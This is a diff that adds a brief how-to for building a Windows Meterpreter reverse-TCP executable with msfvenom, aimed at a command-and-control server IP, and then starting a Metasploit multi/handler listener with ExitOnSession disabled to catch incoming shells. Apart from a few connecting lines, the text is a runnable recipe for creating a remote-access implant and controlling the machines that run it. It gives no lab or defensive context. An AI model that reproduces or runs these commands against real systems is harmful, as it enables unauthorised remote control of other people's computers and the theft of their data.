@@ -1,0 +1,13 @@
+run the folloing tcommand in cmd to create the "client" code
+
+msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=<c&c server ip> LPORT=<chosen port (have to be the same with payload)> -f exe > <outpot file name>
+
+when the server is listening run the exe file
+
+run in server the folloing commands
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <c&c server ip>
+set LPORT <the chosen port>
+set ExitOnSession false
+exploit -j
